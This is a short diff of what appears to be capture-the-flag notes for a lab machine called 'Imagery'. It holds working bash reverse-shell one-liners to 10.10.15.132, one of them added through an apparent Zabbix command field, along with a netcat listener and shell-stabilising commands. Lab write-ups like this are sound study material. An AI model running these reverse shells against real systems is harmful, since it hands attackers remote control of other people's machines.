@@ -19,15 +19,20 @@ YAML:     config.yaml
 ```
 /bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.15.132/9011 0>&1'
 
+
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 web@Imagery:~/web$ ^Z
 [1]+  Stopped                 nc -lvnp 9011
 [★]$ stty raw -echo;fg
 nc -lvnp 9011
              export TERM=xterm
+
+[zabbix_cmd]>>:  bash -c "/bin/bash -i >& /dev/tcp/10.10.15.132/1337 0>&1" &  
 ```
 #### env
 ```
 [★]$ python3 -m venv .venv
 [★]$ source .venv/bin/activate
 ```
+
+#### rsa_id form Watcher
